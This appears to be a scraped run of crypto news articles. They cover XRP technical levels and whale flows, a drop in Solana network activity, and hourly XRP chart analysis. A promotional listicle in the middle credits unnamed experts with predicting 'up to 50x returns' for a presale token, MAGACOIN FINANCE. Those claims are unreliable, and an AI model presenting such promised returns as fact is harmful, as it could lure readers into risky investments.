In derivatives, momentum has cooled as the futures open interest has slipped to roughly $8.85 billion after briefly topping $9 billion, and liquidation data shows the strain on bulls, over $11 million in long positions were wiped out in a single day versus just $2.4 million for shorts. With RSI hovering in the high-30s/low-40s on lower time frames and MACD leaning negative, the setup favors consolidation or further downside unless spot demand meaningfully re-emerges. On-Chain Flows Turn Risk-Off as XRP Whales Distribute Under the hood, flows are skewing defensive. Exchange data shows more than 320 million XRP moved onto centralized venues in the past week, pushing exchange reserves toward nine-month highs, typically a sign that holders are preparing to sell. Similarly, whale cohorts (1–10 million XRP) have distributed about 440 million tokens over 30 days, adding supply into a soft tape. BNB has flipped XRP for the No. 3 market-cap slot amid record BNB Chain activity, while uncertainty around U.S. spot ETF timelines keeps XRP’s macro catalysts murky. Until those headwinds clear or outflows reverse, rallies into resistance are likely to meet supply. Key Levels to Watch for the XRP Price: $2.68 or $3.15 Decide the Next Leg Technically, XRP is compressing inside a descending triangle, making $2.68–$2.70 the pivotal shelf. Veteran traders warn that a weekly close below $2.687 could open a measured move toward $2.22 (roughly –20% from current prices). Immediate resistance sits at $2.92–$3.00; above that, $3.15 is the line that would invalidate the bearish pattern and shift targets to $3.60–$4.50. In the near term, watch for: Spot-led bids and declining funding on bounces (healthier than leverage-driven pops). Exchange reserve inflections (a downturn would ease sell pressure). Open interest rebuilding without overcrowded longs. With futures interest easing and whales distributing, risk remains skewed to the downside while XRP holds below $3.00. Bulls need a clean, high-volume reclaim of $3.00–$3.15 to flip momentum; otherwise, a $2.70 retest, and potentially $2.22 on a breakdown, stays in play.

52923824,https://www.newsbtc.com/?p=835752,1760068808,https://resources.cryptocompare.com/news/21/52923824.jpeg,Solana Network Activity Drops 50%: Is The Rally Built On Weak Fundamentals?,https://www.newsbtc.com/news/solana/solana-network-activity-drops-50-is-the-rally-built-on-weak-fundamentals/,"Solana is experiencing sharp volatility as the broader crypto market faces growing uncertainty. While some analysts expect an expansive move across the market, others remain cautious, pointing to Bitcoin’s difficulty in breaking cleanly into price discovery as a potential headwind. Solana, which has rallied strongly in recent weeks, now shows signs of divergence between its price action and underlying network activity — a signal that often raises questions about sustainability. Related Reading: Short-Term Holder Supply Rises By 559K Bitcoin – New Buyers Flood the Market According to Crypto Onchain, a CryptoQuant analyst, a closer look at Solana’s onchain data reveals a negative divergence between its price and the number of network transactions. This means that while SOL’s price continues to climb, overall transaction activity on the network has dropped significantly. Such patterns are typically viewed as warning signs, suggesting that price momentum might be driven more by speculative trading than organic growth in network usage. Still, market sentiment around Solana remains mixed. Bulls argue that the decline in transaction count could stem from structural changes in the network’s voting activity rather than a true drop in user engagement. As Solana consolidates amid these conflicting signals, investors are watching closely to determine whether this volatility marks a healthy correction — or the early signs of exhaustion in its rally. Solana Activity Declines Despite Strong Price Rally According to data from CryptoQuant, Solana’s network is showing a sharp contraction in transactional activity even as its price continues to rally. The daily transaction volume has fallen from roughly 125 million on July 24, 2025, to around 64 million today, marking a drop of nearly 50%. What makes this decline particularly notable is that it has occurred during a period of strong upward movement in SOL’s price, creating a negative divergence between price momentum and network fundamentals. This divergence presents an important warning signal. In a healthy market environment, price appreciation should ideally be supported by growth in real ecosystem usage — meaning more DeFi activity, NFT transactions, and user transfers. Instead, the data suggests that Solana’s recent rally could be driven more by market sentiment and speculative enthusiasm rather than sustained organic demand on-chain. However, to understand the full picture, it’s necessary to examine which transactions are declining. Historically, 80–90% of Solana’s activity consists of “voting” transactions, which are essential for maintaining network consensus. A reduction in those does not necessarily reflect lower user activity. If, however, the drop stems from reduced DeFi and NFT interactions, it could signal weakening fundamentals behind Solana’s price surge. Analysts are watching closely to determine whether this trend represents a temporary technical adjustment or an early warning of speculative overheating. If user-driven activity continues to decline, Solana could face increased risk of a deeper correction, testing whether the recent price rally is truly sustainable. Related Reading: Coinbase Premium Gap Signals Strongest Bitcoin Accumulation Since ETF Launch – Details Price Analysis: Consolidation After a Strong Rally Solana (SOL) is showing signs of consolidation after an extended rally that pushed its price above the $240 level earlier this month. The chart reveals that SOL has entered a short-term corrective phase, currently trading near $221, down about 3.5% on the day. Despite the pullback, Solana maintains a bullish market structure, as it continues to trade above the key 50-day, 100-day, and 200-day moving averages, which are trending upward — a sign that momentum remains in favor of the bulls. The $210–$215 zone stands out as the immediate support area, coinciding with the 50-day moving average. Holding above this level would confirm that buyers remain in control and could prepare the asset for another attempt to reclaim $240–$250. A successful breakout above these levels could open the path toward $280, where Solana faced resistance in late 2024.

Overall, Solana appears to be stabilizing after its recent surge, and maintaining support above the 50-day MA will be key for sustaining bullish momentum as the market awaits confirmation of the next major move.

Despite recent volatility, several well-established projects and a few emerging names are showing remarkable resilience – and analysts believe they could deliver substantial gains once market momentum accelerates. Among them, MAGACOIN FINANCE has emerged as a standout favorite, with experts predicting up to 50x returns once it lists on major exchanges. Meanwhile, heavyweights like Cardano (ADA), TRON (TRX), Chainlink (LINK), and Dogecoin (DOGE) continue to surprise the market with steady performance and expanding use cases. Together, these five assets represent some of the most compelling opportunities of the current cycle. Cardano (ADA) – Preparing for Its Next Leap Cardano has been quietly consolidating above key support levels, maintaining its reputation as one of the most development-focused networks in the crypto ecosystem. With the Voltaire governance era nearing full implementation, ADA holders are set to gain increased influence over network decisions, marking a new chapter of decentralization. Despite its slow and methodical approach, Cardano’s fundamentals remain strong. Analysts believe the completion of its governance upgrades and scaling efforts could trigger renewed market interest, setting the stage for ADA to reclaim higher valuations as the 2025 bull market gains pace. TRON (TRX) – The Unsung Utility Powerhouse T RON has continued to outperform expectations in 2025, driven by growing adoption of its stablecoin infrastructure and DeFi applications. The network’s fast and low-cost transactions have made it one of the preferred platforms for transferring digital assets globally. With TRON’s total value locked (TVL) steadily climbing and partnerships expanding across Asia, the project’s fundamentals have never looked stronger. Its consistent on-chain growth has led analysts to classify TRX as one of the most undervalued top-20 cryptocurrencies, particularly given its strong profitability and network activity during bear cycles. MAGACOIN FINANCE – The Next 50x Opportunity While established networks continue to build, MAGACOIN FINANCE has taken the spotlight as the most promising new altcoin of 2025. The project’s meteoric rise during its presale, raising millions from early investors, reflects its growing global demand and expanding ecosystem. Experts believe that once MAGACOIN FINANCE secures listings on major exchanges, early participants could see returns as high as 50x, fueled by rising liquidity and community adoption. The project’s ecosystem design prioritizes long-term growth over short-term hype, integrating real-world use cases and partnerships aimed at sustained market relevance. Its social momentum has also exploded in recent weeks, making MAGACOIN FINANCE one of the most talked-about crypto projects across X (Twitter), Telegram, and Reddit. With strong fundamentals and rising visibility, many analysts see it as the next major altcoin to lead the 2025 bull market. Chainlink (LINK) – Powering the Next Generation of DeFi Chainlink continues to dominate the decentralized data sector, serving as the backbone of on-chain connectivity for both DeFi and institutional blockchain integrations. Its Cross-Chain Interoperability Protocol (CCIP) is gaining traction rapidly, enabling secure asset and data transfers across multiple blockchains. With traditional finance institutions experimenting with tokenized assets and smart contract automation, Chainlink’s technology is positioned at the heart of the transformation. LINK’s relatively low valuation compared to its utility has prompted many to label it undervalued, especially given the role it’s expected to play in the next phase of crypto adoption. Dogecoin (DOGE) – From Meme to Mainstream Dogecoin’s transformation from a joke to a corporate-backed digital reserve has been one of 2025’s biggest surprises. Institutional interest is surging, led by CleanCore Solutions, which recently launched a $175 million Dogecoin Treasury, now holding over 710 million DOGE. The company’s plan to expand its holdings to 1 billion DOGE has validated Dogecoin’s position as more than just a meme coin – it’s now part of the growing corporate crypto treasury trend. Combined with network upgrades like the Cardinals Index Node, Dogecoin is evolving into a credible, large-cap digital asset that still trades well below its potential. The Bottom Line The current market cycle is proving that innovation and community-driven growth still define crypto success. While giants like Bitcoin and Ethereum dominate headlines, it’s often the undervalued altcoins that deliver the most impressive gains during bullish recoveries. With MAGACOIN FINANCE leading the charge among emerging projects, and established names like Cardano, TRON, Chainlink, and Dogecoin showing renewed strength, investors are keeping a close eye on these assets as prime candidates for exponential upside in 2025.

The price is now struggling and might continue to move down if it trades below $2.780. XRP price is slowly moving lower below the $2.850 zone. The price is now trading below $2.850 and the 100-hourly Simple Moving Average. There is a key bearish trend line forming with resistance at $2.8350 on the hourly chart of the XRP/USD pair (data source from Kraken). The pair could start a fresh decline if it settles below $2.780. XRP Price Dips Again XRP price failed to stay above $2.950 and started a fresh decline, like Bitcoin and Ethereum . The price declined below $2.920 and $2.90 to enter a short-term bearish zone. The price tested the $2.770 zone and recently attempted a recovery wave. It is now approaching the 23.6% Fib retracement level of the downward move from the $3.05 swing high to the $2.770 swing low. However, the price could face hurdles near $2.850. The price is now trading below $2.850 and the 100-hourly Simple Moving Average. Besides, there is a key bearish trend line forming with resistance at $2.8350 on the hourly chart of the XRP/USD pair. If there is a fresh upward move, the price might face resistance near the $2.8350 level. The first major resistance is near the $2.90 level. A clear move above the $2.880 resistance might send the price toward the $2.950 resistance and the 61.8% Fib retracement level of the downward move from the $3.05 swing high to the $2.770 swing low. Any more gains might send the price toward the $3.00 resistance. The next major hurdle for the bulls might be near $3.050. More Losses? If XRP fails to clear the $2.920 resistance zone, it could start a fresh decline. Initial support on the downside is near the $2.780 level. The next major support is near the $2.750 level. If there is a downside break and a close below the $2.750 level, the price might continue to decline toward $2.720. The next major support sits near the $2.650 zone, below which the price could continue lower toward $2.60. Technical Indicators Hourly MACD – The MACD for XRP/USD is now gaining pace in the bearish zone. Hourly RSI (Relative Strength Index) – The RSI for XRP/USD is now below the 50 level.
